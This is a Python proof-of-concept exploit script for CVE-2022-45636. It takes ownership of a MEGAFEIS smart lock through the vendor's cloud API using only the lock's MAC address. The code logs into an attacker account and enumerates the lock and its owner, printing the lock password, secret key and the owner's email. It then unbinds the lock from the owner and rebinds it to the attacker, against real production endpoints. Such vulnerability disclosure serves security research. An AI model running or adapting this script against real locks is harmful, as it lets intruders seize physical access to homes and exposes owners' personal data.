#!/bin/python3

# This script is a PoC for CVE-2022-45636

# It is designed to transfer ownership of a MEGAFEIS smart lock from a legitimate user to an attacker using just the lock's MAC address

import sys
import os

current_script_dir = os.path.dirname(__file__)
script_modules_dir = os.path.join(current_script_dir, "..", "script_modules")
sys.path.append(script_modules_dir)

import requests
from collections import OrderedDict
import json
import signkey_generator
import helper_functions
import js2py
import time
import getpass

# This function authenticates the attacker and sets the API token as well as the user code for lock reassignment operations

def attacker_login(attacker_username, attacker_password):
        
    api_login_endpoint = "http://service.oklok.com.cn/app/login/pword"

    # Request body containing a bunch of device telemetry as well as credentials for the attacker's account

    request_body = {

        "phone":attacker_username,
        "pword":attacker_password,
        "errMsg":"getSystemInfoSync:ok",
        "brand":"LGE",
        "model":"Nexus 5X",
        "pixelRatio":2.625,
        "screenWidth":411,
        "screenHeight":683,
        "windowWidth":411,
        "windowHeight":615,
        "statusBarHeight":24,
        "language":"en-US",
        "system":"Android 8.1.0",
        "version":"1.9.9.81245",
        "fontSizeSetting":"",
        "platform":"android",
        "SDKVersion":"",
        "windowTop":0,
        "windowBottom":0,
        "safeArea":
            {
                "left":0,
                "right":411,
                "top":0,
                "bottom":615,
                "width":411,
                "height":615
            },
        "safeAreaInsets":
            {
                "top":0,
                "right":0,
                "bottom":0,
                "left":0
            },
        "deviceId":"41ce875094b89734",
        "org":"100100100",
        "appid":"wxda28f39391f7372d",
        "appVersion":"DBD+1.4.2"
    }

    request_cookies = helper_functions.get_cookie()

    # Below is the JavaScript function (in Python) that the DBD+ app used (app-service.js) to generate the custom date string for the "Content-Date" & "SecSignDest" headers
    
    date_string = helper_functions.get_date_string()

    # The "separators" argument of the json.dumps() function removes all white spaces between key:value pairs (which was required for request acceptance)

    content_length = str(len(json.dumps(request_body,separators=(',', ':'))))

    # Below, an MD5 hash which the API uses to validate requests is generated using a custom date string, the request body (a portion of it), and the API endpoint

    sign_key = signkey_generator.generate_signkey(date_string, json.dumps(request_body,separators=(',', ':')), "login/pword")

    # The HTTP headers, apart from the "SecSignDest", "Content-Date", and "Content-Length" are inconsequential to the accpetance of the request (token/usercode is needed in other requests)

    request_headers = OrderedDict()
    request_headers["appid"] = "wxda28f39391f7372d"
    request_headers["SecSignDest"] = sign_key
    request_headers["Content-Date"] = date_string
    request_headers["lang"] = "en-US"
    request_headers["token"] = ""
    request_headers["user-agent"] = "Mozilla/5.0 (Linux; Android 8.1.0; Nexus 5X Build/OPM7.181205.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.89 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/24.0)"
    request_headers["Content-Type"] = "application/json"
    request_headers["Content-Length"] = content_length
    request_headers["Host"] = "service.oklok.com.cn"
    request_headers["Connection"] = "close"
    request_headers["Accept-Encoding"] = "gzip, deflate"

    # TODO: Make sure to remove post-development

    proxy = helper_functions.get_proxy()

    # Session objects were chosen for request handling to allow for deletion of the "Accept" header (which is automagically added for some reason)
    
    session = requests.Session()

    api_request = requests.Request('POST', api_login_endpoint, headers=request_headers, data=json.dumps(request_body,separators=(',', ':')),cookies=request_cookies) 

    prepared_api_request = session.prepare_request(api_request)

    session.headers = request_headers

    # The server flagged requests with the "Accept" header as "illegal"

    del prepared_api_request.headers['Accept']

    response = session.send(prepared_api_request, proxies=proxy)

    parsed_response = response.json()

    # Once a nice JSON response is returned, the relevant script variables are set and the request code is returned (0 for good / 112 for bad password)

    if(parsed_response["code"] == 0):
        
        global attacker_token 
        attacker_token = parsed_response["data"]["token"]
        global attacker_user_code 
        attacker_user_code = parsed_response["data"]["userCode"]
        
        return parsed_response["code"]
    
    else:
    
        return parsed_response["code"]

# This function queries the API for information about the lock (serial num / current owner)

def enumerate_lock(bd_addr):

    # This first request is to get the lock's serial number from its bd_addr

    api_lock_enum_endpoint = "http://service.oklok.com.cn/app/device/detail2"

    request_body = { "mac":bd_addr,"org":"100100100","appid":"wxda28f39391f7372d","appVersion":"DBD+1.4.2"}

    request_cookies = helper_functions.get_cookie()
    
    date_string = helper_functions.get_date_string()

    content_length = str(len(json.dumps(request_body,separators=(',', ':'))))

    sign_key = signkey_generator.generate_signkey(date_string, json.dumps(request_body,separators=(',', ':')), "device/detail2")

    request_headers = OrderedDict()
    request_headers["appid"] = "wxda28f39391f7372d"
    request_headers["SecSignDest"] = sign_key
    request_headers["Content-Date"] = date_string
    request_headers["lang"] = "en-US"
    request_headers["token"] = attacker_token
    request_headers["user-agent"] = "Mozilla/5.0 (Linux; Android 8.1.0; Nexus 5X Build/OPM7.181205.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.89 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/24.0)"
    request_headers["Content-Type"] = "application/json"
    request_headers["Content-Length"] = content_length
    request_headers["Host"] = "service.oklok.com.cn"
    request_headers["Connection"] = "close"
    request_headers["Accept-Encoding"] = "gzip, deflate"

    # TODO: Make sure to remove post-development

    proxy = helper_functions.get_proxy()
    
    session = requests.Session()

    api_request = requests.Request('POST', api_lock_enum_endpoint, headers=request_headers, data=json.dumps(request_body,separators=(',', ':')),cookies=request_cookies) 

    prepared_api_request = session.prepare_request(api_request)

    session.headers = request_headers

    del prepared_api_request.headers['Accept']

    response = session.send(prepared_api_request, proxies=proxy)

    parsed_response = response.json()

    global lock_serial_number
    lock_serial_number = parsed_response["data"]["_id"]

    ##############################################################################

    api_lock_enum_endpoint2 = "http://service.oklok.com.cn/app/device/detailAll"

    # Request body containing the lock's bd_addr as well as some useless telemetry

    request_body2 = {"_id":lock_serial_number,"condition":"{}","org":"100100100","appid":"wxda28f39391f7372d","appVersion":"DBD+1.4.2"}

    request_cookies2 = {"connect.sid": "s%3Ax70P-E8SMZs0VEQ7VUVJMZ8_qiH0_T6h.5YsYmMlQIwBofp0ATvVerBiPvbKXMDCcRN6MP5EmLDw"}
    
    date_string2 = helper_functions.get_date_string()

    content_length2 = str(len(json.dumps(request_body2,separators=(',', ':'))))

    sign_key2 = signkey_generator.generate_signkey(date_string2, json.dumps(request_body2,separators=(',', ':')), "device/detailAll")

    request_headers2 = OrderedDict()
    request_headers2["appid"] = "wxda28f39391f7372d"
    request_headers2["SecSignDest"] = sign_key2
    request_headers2["Content-Date"] = date_string2
    request_headers2["lang"] = "en-US"
    request_headers2["token"] = attacker_token
    request_headers2["user-agent"] = "Mozilla/5.0 (Linux; Android 8.1.0; Nexus 5X Build/OPM7.181205.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.89 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/24.0)"
    request_headers2["Content-Type"] = "application/json"
    request_headers2["Content-Length"] = content_length2
    request_headers2["Host"] = "service.oklok.com.cn"
    request_headers2["Connection"] = "close"
    request_headers2["Accept-Encoding"] = "gzip, deflate"

    # TODO: Make sure to remove post-development

    proxy2 = helper_functions.get_proxy()
    
    session2 = requests.Session()

    api_request2 = requests.Request('POST', api_lock_enum_endpoint2, headers=request_headers2, data=json.dumps(request_body2,separators=(',', ':')),cookies=request_cookies2) 

    prepared_api_request2 = session2.prepare_request(api_request2)

    session2.headers = request_headers2

    del prepared_api_request2.headers['Accept']

    response2 = session2.send(prepared_api_request2, proxies=proxy2)

    parsed_response2 = response2.json()

    global victim_user_code
    victim_user_code = parsed_response2["data"]["user"]["_id"]

    return parsed_response2

# This function removes the lock from an account

def debind_lock(lock_serial_number, victim_user_code):

    api_unbind_endpoint = "http://service.oklok.com.cn/app/device/unbind"

    request_body = {"_id":lock_serial_number,"user":victim_user_code,"org":"100100100","appid":"wxda28f39391f7372d","appVersion":"DBD+1.4.2"}

    request_cookies = helper_functions.get_cookie()

    date_string = helper_functions.get_date_string()

    content_length = str(len(json.dumps(request_body,separators=(',', ':'))))

    sign_key = signkey_generator.generate_signkey(date_string, json.dumps(request_body,separators=(',', ':')), "device/unbind")

    request_headers = OrderedDict()
    request_headers["appid"] = "wxda28f39391f7372d"
    request_headers["SecSignDest"] = sign_key
    request_headers["Content-Date"] = date_string
    request_headers["lang"] = "en-US"
    request_headers["token"] = attacker_token
    request_headers["user-agent"] = "Mozilla/5.0 (Linux; Android 8.1.0; Nexus 5X Build/OPM7.181205.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.89 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/24.0)"
    request_headers["Content-Type"] = "application/json"
    request_headers["Content-Length"] = content_length
    request_headers["Host"] = "service.oklok.com.cn"
    request_headers["Connection"] = "close"
    request_headers["Accept-Encoding"] = "gzip, deflate"

    # TODO: Make sure to remove post-development

    proxy = helper_functions.get_proxy()
    
    session = requests.Session()

    api_request = requests.Request('POST', api_unbind_endpoint, headers=request_headers, data=json.dumps(request_body,separators=(',', ':')),cookies=request_cookies) 

    prepared_api_request = session.prepare_request(api_request)

    session.headers = request_headers

    del prepared_api_request.headers['Accept']

    response = session.send(prepared_api_request, proxies=proxy)

    parsed_response = response.json()

    return parsed_response["code"]

# This function attaches a lock to a certain account

def rebind_lock(lock_serial_number, attacker_user_code, lock_remark):

    api_rebind_endpoint = "http://service.oklok.com.cn/app/device/bind"

    request_body = {"_id":lock_serial_number,"user":attacker_user_code,"remark":lock_remark,"org":"100100100","appid":"wxda28f39391f7372d","appVersion":"DBD+1.4.2"}

    request_cookies = helper_functions.get_cookie()

    date_string = helper_functions.get_date_string()

    content_length = str(len(json.dumps(request_body,separators=(',', ':'))))

    sign_key = signkey_generator.generate_signkey(date_string, json.dumps(request_body,separators=(',', ':')), "device/bind")

    request_headers = OrderedDict()
    request_headers["appid"] = "wxda28f39391f7372d"
    request_headers["SecSignDest"] = sign_key
    request_headers["Content-Date"] = date_string
    request_headers["lang"] = "en-US"
    request_headers["token"] = attacker_token
    request_headers["user-agent"] = "Mozilla/5.0 (Linux; Android 8.1.0; Nexus 5X Build/OPM7.181205.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.89 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/24.0)"
    request_headers["Content-Type"] = "application/json"
    request_headers["Content-Length"] = content_length
    request_headers["Host"] = "service.oklok.com.cn"
    request_headers["Connection"] = "close"
    request_headers["Accept-Encoding"] = "gzip, deflate"

    # TODO: Make sure to remove post-development

    proxy = helper_functions.get_proxy()
    
    session = requests.Session()

    api_request = requests.Request('POST', api_rebind_endpoint, headers=request_headers, data=json.dumps(request_body,separators=(',', ':')),cookies=request_cookies) 

    prepared_api_request = session.prepare_request(api_request)

    session.headers = request_headers

    del prepared_api_request.headers['Accept']

    response = session.send(prepared_api_request, proxies=proxy)

    parsed_response = response.json()

    return parsed_response["code"]

# This function assures the API that the victim is still authenticated prior to sensitive actions

def reassure_auth_state(lock_serial_number, victim_user_code):

    api_reassure_endpoint = "http://service.oklok.com.cn/app/deviceAuthOne/sureAuthOne"

    request_body = {"device":lock_serial_number,"user":victim_user_code,"org":"100100100","appid":"wxda28f39391f7372d","appVersion":"DBD+1.4.2"}

    request_cookies = helper_functions.get_cookie()

    date_string = helper_functions.get_date_string()

    content_length = str(len(json.dumps(request_body,separators=(',', ':'))))

    sign_key = signkey_generator.generate_signkey(date_string, json.dumps(request_body,separators=(',', ':')), "deviceAuthOne/sureAuthOne")

    request_headers = OrderedDict()
    request_headers["appid"] = "wxda28f39391f7372d"
    request_headers["SecSignDest"] = sign_key
    request_headers["Content-Date"] = date_string
    request_headers["lang"] = "en-US"
    request_headers["token"] = attacker_token
    request_headers["user-agent"] = "Mozilla/5.0 (Linux; Android 8.1.0; Nexus 5X Build/OPM7.181205.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.89 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/24.0)"
    request_headers["Content-Type"] = "application/json"
    request_headers["Content-Length"] = content_length
    request_headers["Host"] = "service.oklok.com.cn"
    request_headers["Connection"] = "close"
    request_headers["Accept-Encoding"] = "gzip, deflate"

    # TODO: Make sure to remove post-development

    proxy = helper_functions.get_proxy()
    
    session = requests.Session()

    api_request = requests.Request('POST', api_reassure_endpoint, headers=request_headers, data=json.dumps(request_body,separators=(',', ':')),cookies=request_cookies) 

    prepared_api_request = session.prepare_request(api_request)

    session.headers = request_headers

    del prepared_api_request.headers['Accept']

    response = session.send(prepared_api_request, proxies=proxy)

    parsed_response = response.json()

    return parsed_response["code"]

# This function handles the lock-stealing logic
    
def takeover_lock(lock_serial_number, victim_user_code, attacker_user_code, lock_remark):

    x = reassure_auth_state(lock_serial_number, victim_user_code)

    DEBIND_STATUS_CODE = 9
    REBIND_STATUS_CODE = 9
    
    if(debind_lock(lock_serial_number, victim_user_code) == 0):

        print("\n[+] Target lock has been disconnected from its owner!")
        DEBIND_STATUS_CODE = 0

    else:

        print("\n[-] There was a problem disconnecting the target lock from its owner!")
        DEBIND_STATUS_CODE = 1

    if(rebind_lock(lock_serial_number, attacker_user_code, lock_remark) == 0):

        print("\n[+] Target lock has been connected to the attacker's account!")
        REBIND_STATUS_CODE = 0

    else:

        print("\n[-] There was a problem connecting the target lock to your account!")
        REBIND_STATUS_CODE = 1

    if(DEBIND_STATUS_CODE == 0 and REBIND_STATUS_CODE == 0):

        return 0
   
    else:

        return 1

# This function handles the lock-returning logic

def return_lock(lock_serial_number, victim_user_code, attacker_user_code, lock_remark):

    x = reassure_auth_state(lock_serial_number, victim_user_code)

    DEBIND_STATUS_CODE = 9
    REBIND_STATUS_CODE = 9
    
    if(debind_lock(lock_serial_number, attacker_user_code) == 0):

        print("\n[+] Target lock has been disconnected from the attacker!")
        DEBIND_STATUS_CODE = 0

    else:

        print("\n[-] There was a problem disconnecting the target lock from the attacker!")
        DEBIND_STATUS_CODE = 1

    if(rebind_lock(lock_serial_number, victim_user_code, lock_remark) == 0):

        print("\n[+] Target lock has been connected to the original owner's account!")
        REBIND_STATUS_CODE = 0

    else:

        print("\n[-] There was a problem connecting the target lock to its origianl owner's account!")
        REBIND_STATUS_CODE = 1

    if(DEBIND_STATUS_CODE == 0 and REBIND_STATUS_CODE == 0):

        return 0
   
    else:

        return 1

def main():

    print("\n[*] CVE-2022-45636 PoC")
    print("[*] Author: Abdullah Ansari")

    SUCCESS_CODE = 0

    bd_addr = ""

    if len(sys.argv) != 3:

        sys.exit('\nUsage: python3 CVE-2022-45636_PoC.py <bd_addr> <attacker_email/phone>')
    
    else:
    
        bd_addr = str(sys.argv[1])
        attacker_username = sys.argv[2]
        attacker_password = getpass.getpass('\nAttacker Password: ')

    print("\n[*] Logging in to your account...")
    time.sleep(2)

    if(attacker_login(attacker_username,attacker_password) == SUCCESS_CODE):

        print("\n[+] Login successful!")

        print("\nAttacker API Token: " + attacker_token)
        print("Attacker User Code: " + attacker_user_code)

        print("\n[*] Searching for the lock and its owner...")
        time.sleep(2)

        global lock_data
        lock_data = enumerate_lock(bd_addr)

        if(lock_data["code"] == SUCCESS_CODE):

            print("\n[+] The target lock was found!")

            print("\nLock Serial Number: " + lock_serial_number)
            print("Device Type: " + lock_data["data"]["deviceType"])
            print("MAC Address: " + lock_data["data"]["mac"])
            print("Password: " + lock_data["data"]["pword"])
            print("Secret Key: " + lock_data["data"]["secretKey"])
            print("Bluetooth Name: " + lock_data["data"]["bluName"])
            print("Display Name: " + lock_data["data"]["remark"])

            print("\n[+] The lock's owner was found!")

            print("\nOwner Name: " + lock_data["data"]["user"]["nickName"])
            print("Owner User Code: " + victim_user_code)
            print("Owner Email: " + lock_data["data"]["user"]["email"])
            print("Owner Device: " + lock_data["data"]["user"]["brand"] + " " + lock_data["data"]["user"]["model"] + " running " + lock_data["data"]["user"]["system"])

        else:

            print("\n[-] Could not find the lock or its owner! Please enter the correct bd_addr...")


        print("\n[*] Taking over the lock...")
        time.sleep(2)

        if(takeover_lock(lock_serial_number, victim_user_code, attacker_user_code, lock_data["data"]["remark"]) == SUCCESS_CODE):

            print("\n[+] Lock takeover complete!")

            user_selection = input("\nWould you like to return the lock to its owner? [y/n]")

            if(str(user_selection).lower().strip() == "y"):

                print("\n[*] Returning the lock...")
                time.sleep(2)

                if(return_lock(lock_serial_number, victim_user_code, attacker_user_code, lock_data["data"]["remark"]) == SUCCESS_CODE):

                    print("\n[+] Lock return complete!")

                else:

                    print("\n[-] There was a problem returning the lock!")

            else:

                sys.exit()

        else:

            print("\n[-] There was a problem taking over the lock!")

    else:

        print("\n[-] Login failed! Please enter the correct credentials for your account!")
    

if __name__ == '__main__':
    main()